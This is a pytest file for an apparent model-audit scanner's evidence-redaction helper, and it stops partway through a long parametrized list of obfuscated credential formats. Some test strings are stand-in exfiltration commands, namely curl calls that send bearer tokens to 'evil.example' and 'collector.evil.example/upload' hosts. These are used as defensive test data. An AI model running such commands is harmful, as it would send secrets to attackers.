"""Tests for scanner evidence redaction helpers."""

from collections.abc import Callable
from typing import Any

import pytest

from modelaudit.scanners import _evidence_redaction as evidence_redaction
from modelaudit.scanners._evidence_redaction import REDACTED_EVIDENCE_VALUE, redact_evidence_string


def test_redacts_compound_credential_assignments() -> None:
    """Compound credential keys should not preserve raw values."""
    text = (
        "client_secret=CLIENTSECRET123 "
        "refresh_token='REFRESHTOKEN456' "
        'access-token="ACCESSTOKEN789" '
        "service-private-key=PRIVATEKEY000"
    )

    redacted = redact_evidence_string(text, max_chars=2000)

    assert "CLIENTSECRET123" not in redacted
    assert "REFRESHTOKEN456" not in redacted
    assert "ACCESSTOKEN789" not in redacted
    assert "PRIVATEKEY000" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"refresh_token={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"access-token={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"service-private-key={REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_escaped_quoted_credential_assignments() -> None:
    """Escaped quotes in serialized evidence should not leave the quoted value behind."""
    text = (
        r"client_secret=\"ESCAPEDCLIENTSECRET123\" "
        r"api_key=\\\"NESTEDESCAPEDAPIKEY321\\\" "
        r"Authorization: Bearer \"ESCAPEDBEARER456\" "
        r"Authorization: Bearer \\\"NESTEDESCAPEDBEARER654\\\" "
        r"Bearer \"ESCAPEDSTANDALONE789\""
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "ESCAPEDCLIENTSECRET123" not in redacted
    assert "NESTEDESCAPEDAPIKEY321" not in redacted
    assert "ESCAPEDBEARER456" not in redacted
    assert "NESTEDESCAPEDBEARER654" not in redacted
    assert "ESCAPEDSTANDALONE789" not in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Bearer {REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_attacker_supplied_redacted_marker_prefixes() -> None:
    """A literal '<redacted>' prefix in attacker evidence is not proof that the rest is safe."""
    text = (
        r"api_key=\"<redacted>\"MARKER_API_SUFFIX_SECRET123 "
        r"Authorization: Bearer \"<redacted>\"MARKER_AUTH_SUFFIX_SECRET456"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "MARKER_API_SUFFIX_SECRET123" not in redacted
    assert "MARKER_AUTH_SUFFIX_SECRET456" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_backslash_prefixed_unquoted_credentials() -> None:
    """Backslash-prefixed serialized values should still use the fallback redactor."""
    text = (
        r"api_key=\SLASHAPISECRET123 "
        r"Authorization: \SLASHAUTHSECRET456 "
        r"client_secret=\u0022UNICODEESCAPEDSECRET789\u0022"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "SLASHAPISECRET123" not in redacted
    assert "SLASHAUTHSECRET456" not in redacted
    assert "UNICODEESCAPEDSECRET789" not in redacted
    assert f"api_key={REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert f"client_secret={REDACTED_EVIDENCE_VALUE}" in redacted


def test_preserves_command_context_after_authorization_header_redaction() -> None:
    """Shell header redaction should not swallow the URL that proves the command sink."""
    text = (
        'bash -c curl -H "Authorization: Bearer sk-runtime-secret1234567890" '
        "https://user:pass123@evil.example/payload?token=tok_runtime"
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert "sk-runtime-secret" not in redacted
    assert "pass123" not in redacted
    assert "tok_runtime" not in redacted
    assert "curl" in redacted
    assert "evil.example" in redacted
    assert f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "token=<redacted>" in redacted


def test_bare_authorization_value_redacts_token_before_context() -> None:
    """Authorization without a known scheme should redact the first token, not the following evidence."""
    text = "Authorization: sk-live-secret curl https://collector.evil.example/upload"

    redacted = redact_evidence_string(text, max_chars=500)

    assert "sk-live-secret" not in redacted
    assert f"Authorization: {REDACTED_EVIDENCE_VALUE}" in redacted
    assert "curl" in redacted
    assert "collector.evil.example" in redacted


@pytest.mark.parametrize(
    ("text", "secret"),
    [
        (
            "Authorization: ApiKey MYSECRET123 curl https://collector.evil.example/upload",
            "MYSECRET123",
        ),
        (
            'curl -H "Authorization: OAuth MYSECRET456" https://collector.evil.example/upload',
            "MYSECRET456",
        ),
    ],
)
def test_unknown_authorization_scheme_redacts_credential_before_context(text: str, secret: str) -> None:
    """Unknown Authorization schemes should not leave their credential token behind."""
    redacted = redact_evidence_string(text, max_chars=500)

    assert secret not in redacted
    assert "curl" in redacted
    assert "collector.evil.example" in redacted
    assert REDACTED_EVIDENCE_VALUE in redacted


def test_redaction_runtime_is_bounded_before_truncation() -> None:
    """Evidence redaction should not scan attacker-controlled megabyte strings before truncating."""
    text = "api_key=" + ("\\\\" * 200_000) + '"unterminated-secret'

    redacted = redact_evidence_string(text, max_chars=120)

    assert len(redacted) <= 120
    assert redacted.startswith(f"api_key={REDACTED_EVIDENCE_VALUE}")


def test_redacts_long_delimited_values_before_report_truncation() -> None:
    """Long URLs and quoted Bearer values should be redacted even when delimiters are far away."""
    long_url_secret = "LONGURLPASSWORDSECRET123"
    long_bearer_secret = "LONGBEARERSECRET456"
    text = (
        f"https://user:{long_url_secret}{'a' * 5000}@collector.evil.example/upload "
        rf"Bearer \"{long_bearer_secret}{'b' * 5000}\""
    )

    redacted = redact_evidence_string(text, max_chars=500)

    assert long_url_secret not in redacted
    assert long_bearer_secret not in redacted
    assert "https://<credentials-redacted>@collector.evil.example/upload" in redacted
    assert f"Bearer {REDACTED_EVIDENCE_VALUE}" in redacted


def test_redacts_long_quoted_values_with_internal_delimiters() -> None:
    """If a long quoted sensitive value is cut before closing, redact the whole reportable prefix."""
    cases = [
        (
            f'api_key="prefix C001_LONG_SPACE_API_SECRET_123456{"a" * 5000}"',
            "C001_LONG_SPACE_API_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f'Authorization: Bearer "prefix;C001_LONG_SEMI_AUTH_SECRET_123456{"a" * 5000}"',
            "C001_LONG_SEMI_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f'Bearer "prefix C001_LONG_SPACE_BEARER_SECRET_123456{"a" * 5000}"',
            "C001_LONG_SPACE_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u0022prefix C001_UNICODE_SPACE_SECRET_123456\u0022",
            "C001_UNICODE_SPACE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u0022prefix;C001_UNICODE_AUTH_SECRET_123456\u0022",
            "C001_UNICODE_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u0022prefix C001_UNICODE_BEARER_SECRET_123456\u0022",
            "C001_UNICODE_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\u0022prefix C001_ENCBACKSLASH_API_SECRET_123456\u005c\u0022",
            "C001_ENCBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u005c\u0022prefix;C001_ENCBACKSLASH_AUTH_SECRET_123456\u005c\u0022",
            "C001_ENCBACKSLASH_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u005c\u0022prefix C001_ENCBACKSLASH_BEARER_SECRET_123456\u005c\u0022",
            "C001_ENCBACKSLASH_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\u0027prefix C001_ENCBACKSLASH_SINGLE_SECRET_123456\u005c\u0027",
            "C001_ENCBACKSLASH_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\\u005c\\u0022prefix C001_DOUBLEENC_API_SECRET_123456\\u005c\\u0022",
            "C001_DOUBLEENC_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \\u005c\\u0022prefix;C001_DOUBLEENC_AUTH_SECRET_123456\\u005c\\u0022",
            "C001_DOUBLEENC_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \\u005c\\u0022prefix C001_DOUBLEENC_BEARER_SECRET_123456\\u005c\\u0022",
            "C001_DOUBLEENC_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\\u005c\\u0027prefix C001_DOUBLEENC_SINGLE_SECRET_123456\\u005c\\u0027",
            "C001_DOUBLEENC_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\"prefix C001_MIXED_API_SECRET_123456\u005c\"",
            "C001_MIXED_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u005c\"prefix;C001_MIXED_AUTH_SECRET_123456\u005c\"",
            "C001_MIXED_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u005c\"prefix C001_MIXED_BEARER_SECRET_123456\u005c\"",
            "C001_MIXED_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\\u005c\\\"prefix C001_DOUBLEMIXED_API_SECRET_123456\\u005c\\\"",
            "C001_DOUBLEMIXED_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \\u005c\\\"prefix;C001_DOUBLEMIXED_AUTH_SECRET_123456\\u005c\\\"",
            "C001_DOUBLEMIXED_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \\u005c\\\"prefix C001_DOUBLEMIXED_BEARER_SECRET_123456\\u005c\\\"",
            "C001_DOUBLEMIXED_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\u005c\'prefix C001_MIXED_SINGLE_SECRET_123456\u005c\'",
            "C001_MIXED_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x22prefix C001_HEX_API_SECRET_123456\x22",
            "C001_HEX_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \x22prefix;C001_HEX_AUTH_SECRET_123456\x22",
            "C001_HEX_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \x22prefix C001_HEX_BEARER_SECRET_123456\x22",
            "C001_HEX_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x27prefix C001_HEX_SINGLE_SECRET_123456\x27",
            "C001_HEX_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x5c\x22prefix C001_HEXBACKSLASH_API_SECRET_123456\x5c\x22",
            "C001_HEXBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \x5c\x22prefix;C001_HEXBACKSLASH_AUTH_SECRET_123456\x5c\x22",
            "C001_HEXBACKSLASH_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u005c\x22prefix C001_UNICODE_HEX_BEARER_SECRET_123456\u005c\x22",
            "C001_UNICODE_HEX_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\x5c\"prefix C001_HEXMIXED_API_SECRET_123456\x5c\"",
            "C001_HEXMIXED_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\042prefix C001_OCTAL_API_SECRET_123456\042",
            "C001_OCTAL_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \042prefix;C001_OCTAL_AUTH_SECRET_123456\042",
            "C001_OCTAL_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\047prefix C001_OCTAL_SINGLE_SECRET_123456\047",
            "C001_OCTAL_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\134\042prefix C001_OCTALBACKSLASH_API_SECRET_123456\134\042",
            "C001_OCTALBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \U00000022prefix C001_LONGU_BEARER_SECRET_123456\U00000022",
            "C001_LONGU_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u{22}prefix;C001_JSU_AUTH_SECRET_123456\u{22}",
            "C001_JSU_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\U0000005c\U00000022prefix C001_LONGUBACKSLASH_API_SECRET_123456\U0000005c\U00000022",
            "C001_LONGUBACKSLASH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u{5c}\u{22}prefix C001_JSUBACKSLASH_BEARER_SECRET_123456\u{5c}\u{22}",
            "C001_JSUBACKSLASH_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\42prefix C001_SHORTOCT_API_SECRET_123456\42",
            "C001_SHORTOCT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \42prefix;C001_SHORTOCT_AUTH_SECRET_123456\42",
            "C001_SHORTOCT_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\47prefix C001_SHORTOCT_SINGLE_SECRET_123456\47",
            "C001_SHORTOCT_SINGLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Bearer \u{0022}prefix C001_PADJS_BEARER_SECRET_123456\u{0022}",
            "C001_PADJS_BEARER_SECRET",
            f"Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u{005c}\u{0022}prefix;C001_PADJSBS_AUTH_SECRET_123456\u{005c}\u{0022}",
            "C001_PADJSBS_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="""prefix C001_TRIPLE_API_SECRET_123456"""',
            "C001_TRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer """prefix;C001_TRIPLE_AUTH_SECRET_123456"""',
            "C001_TRIPLE_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=r"prefix C001_PREFIX_API_SECRET_123456"',
            "C001_PREFIX_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer f"prefix;C001_PREFIX_AUTH_SECRET_123456"',
            "C001_PREFIX_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f'client_secret="""prefix C001_LONGTRIPLE_API_SECRET_123456{"a" * 5000}',
            "C001_LONGTRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\uu0022prefix C001_UU_API_SECRET_123456\uu0022",
            "C001_UU_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=\"\"\"prefix C001_ESCTRIPLE_API_SECRET_123456\"\"\"",
            "C001_ESCTRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"Authorization: Bearer \u0022\u0022\u0022prefix;C001_UNITRIPLE_AUTH_SECRET_123456\u0022\u0022\u0022",
            "C001_UNITRIPLE_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"client_secret=r\u0022\u0022\u0022prefix C001_PUNITRIPLE_API_SECRET_123456\u0022\u0022\u0022",
            "C001_PUNITRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            f"client_secret=r\\u0022\\u0022\\u0022prefix C001_LONG_UNITRIPLE_API_SECRET_123456{'a' * 5000}",
            "C001_LONG_UNITRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=("prefix C001_PAREN_API_SECRET_123456")',
            "C001_PAREN_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " "C001_CONCAT_API_SECRET_123456"',
            "C001_CONCAT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " """C001_CONCAT_TRIPLE_SECRET_123456"""',
            "C001_CONCAT_TRIPLE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "prefix;" "C001_CONCAT_AUTH_SECRET_123456"',
            "C001_CONCAT_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " + "C001_PLUS_API_SECRET_123456"',
            "C001_PLUS_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=("prefix " + "C001_PARENPLUS_API_SECRET_123456")',
            "C001_PARENPLUS_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix " + """C001_PLUSTRIPLE_API_SECRET_123456"""',
            "C001_PLUSTRIPLE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "prefix;" + "C001_PLUS_AUTH_SECRET_123456"',
            "C001_PLUS_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix %s" % "C001_PERCENT_API_SECRET_123456"',
            "C001_PERCENT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=("prefix %s" % "C001_PARENPERCENT_API_SECRET_123456")',
            "C001_PARENPERCENT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "prefix;%s" % "C001_PERCENT_AUTH_SECRET_123456"',
            "C001_PERCENT_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "client_secret=''.join(('prefix ', 'C001_JOIN_API_SECRET_123456'))",
            "C001_JOIN_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="prefix {}".format("C001_FORMAT_API_SECRET_123456")',
            "C001_FORMAT_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'Authorization: Bearer "".join(("prefix;", "C001_JOIN_AUTH_SECRET_123456"))',
            "C001_JOIN_AUTH_SECRET",
            f"Authorization: Bearer {REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="" or "C001_OR_API_SECRET_123456"',
            "C001_OR_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="decoy" if False else "C001_ELSE_API_SECRET_123456"',
            "C001_ELSE_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret="" * 0 + "C001_MATHPLUS_API_SECRET_123456"',
            "C001_MATHPLUS_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=str("C001_CALLFIRST_API_SECRET_123456")',
            "C001_CALLFIRST_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=["C001_LISTFIRST_API_SECRET_123456"][0]',
            "C001_LISTFIRST_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=(lambda: "C001_LAMBDAFIRST_API_SECRET_123456")()',
            "C001_LAMBDAFIRST_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=str("token=decoy C001_INNERPREFIX_API_SECRET_123456")',
            "C001_INNERPREFIX_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'client_secret=str("Authorization: Bearer decoy C001_INNERAUTH_API_SECRET_123456")',
            "C001_INNERAUTH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'client_secret=str("quote: \" token=decoy C001_ESCINNER_API_SECRET_123456")',
            "C001_ESCINNER_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'client_secret=str("quote: \" Authorization: Bearer decoy C001_ESCAUTH_API_SECRET_123456")',
            "C001_ESCAUTH_API_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret": "C001_JSONKEY_CLIENT_SECRET_123456"}',
            "C001_JSONKEY_CLIENT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            "config={'api_key': 'C001_JSONKEY_API_SECRET_123456'}",
            "C001_JSONKEY_API_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"client\u005fsecret": "C001_KEYUNICODE_CLIENT_SECRET_123456"}',
            "C001_KEYUNICODE_CLIENT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"api\x5fkey": "C001_KEYHEX_API_SECRET_123456"}',
            "C001_KEYHEX_API_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"config={\"client\\u005fsecret\": \"C001_DOUBLEKEY_SECRET_123456\"}",
            "C001_DOUBLEKEY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r"config={\"api\\x5fkey\": \"C001_DOUBLEAPIKEY_SECRET_123456\"}",
            "C001_DOUBLEAPIKEY_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"client\U0000005fsecret": "C001_KEYLONGU_SECRET_123456"}',
            "C001_KEYLONGU_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            r'config={"api\N{LOW LINE}key": "C001_KEYNAMED_SECRET_123456"}',
            "C001_KEYNAMED_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client" + "_secret": "C001_KEYPLUS_SECRET_123456"}',
            "C001_KEYPLUS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"api" "_key": "C001_KEYIMPLICIT_SECRET_123456"}',
            "C001_KEYIMPLICIT_SECRET",
            f"api_key={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client%s" % "_secret": "C001_KEYPERCENT_SECRET_123456"}',
            "C001_KEYPERCENT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client{}".format("_secret"): "C001_KEYFORMAT_SECRET_123456"}',
            "C001_KEYFORMAT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client{suffix}".format(suffix="_secret"): "C001_KEYKWFORMAT_SECRET_123456"}',
            "C001_KEYKWFORMAT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={f"client{\'_secret\'}": "C001_KEYFSTRING_SECRET_123456"}',
            "C001_KEYFSTRING_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={f"client{\'_secret\'!s}": "C001_KEYFCONV_SECRET_123456"}',
            "C001_KEYFCONV_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={f"client{\'_secret\':s}": "C001_KEYFSPEC_SECRET_123456"}',
            "C001_KEYFSPEC_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={str("client_secret"): "C001_KEYSTRCALL_SECRET_123456"}',
            "C001_KEYSTRCALL_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".strip(): "C001_KEYSTRIP_SECRET_123456"}',
            "C001_KEYSTRIP_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"".join(("client", "_secret")): "C001_KEYJOIN_SECRET_123456"}',
            "C001_KEYJOIN_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"__client_secret__".strip("_"): "C001_KEYSTRIPARG_SECRET_123456"}',
            "C001_KEYSTRIPARG_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"clientXsecret".replace("X", "_"): "C001_KEYREPLACE_SECRET_123456"}',
            "C001_KEYREPLACE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret",)[0]: "C001_KEYINDEX_SECRET_123456"}',
            "C001_KEYINDEX_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"terces_tneilc"[::-1]: "C001_KEYREVERSE_SECRET_123456"}',
            "C001_KEYREVERSE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"TERCES_TNEILC"[::-1].lower(): "C001_KEYREVERSELOWER_SECRET_123456"}',
            "C001_KEYREVERSELOWER_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("terces_tneilc" * 1)[::-1]: "C001_KEYREVERSEMULT_SECRET_123456"}',
            "C001_KEYREVERSEMULT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"TERCES_TNEILC"[::-1].swapcase(): "C001_KEYSWAPCASE_SECRET_123456"}',
            "C001_KEYSWAPCASE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".zfill(0): "C001_KEYZFILL_SECRET_123456"}',
            "C001_KEYZFILL_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client" + "_secret").zfill(0): "C001_KEYCOMPOSEDZFILL_SECRET_123456"}',
            "C001_KEYCOMPOSEDZFILL_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".ljust(0): "C001_KEYLJUST_SECRET_123456"}',
            "C001_KEYLJUST_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".expandtabs(): "C001_KEYEXPANDTABS_SECRET_123456"}',
            "C001_KEYEXPANDTABS_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={"client_secret".replace("", ""): "C001_KEYREPLACEEMPTY_SECRET_123456"}',
            "C001_KEYREPLACEEMPTY_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" or "public"): "C001_KEYBOOLOR_SECRET_123456"}',
            "C001_KEYBOOLOR_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" or "public".islower()): "C001_KEYBOOLSHORT_SECRET_123456"}',
            "C001_KEYBOOLSHORT_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "yes" else "public"): "C001_KEYTRUTHYIF_SECRET_123456"}',
            "C001_KEYTRUTHYIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if 1 else "public"): "C001_KEYNUMIF_SECRET_123456"}',
            "C001_KEYNUMIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if ("yes",) else "public"): "C001_KEYTUPLEIF_SECRET_123456"}',
            "C001_KEYTUPLEIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if 1 == 1 else "public"): "C001_KEYCOMPAREIF_SECRET_123456"}',
            "C001_KEYCOMPAREIF_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if (1 == 1 and 2 == 2) else "public"): "C001_KEYANDCOMPARE_SECRET_123456"}',
            "C001_KEYANDCOMPARE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if not (1 != 1) else "public"): "C001_KEYNOTCOMPARE_SECRET_123456"}',
            "C001_KEYNOTCOMPARE_SECRET",
            f"client_secret={REDACTED_EVIDENCE_VALUE}",
        ),
        (
            'config={("client_secret" if "x" in "x" else "public"): "C001_KEYCONTAINS_SECRET_123456"}',
            "C001_KEYCONTAINS_SECRET",
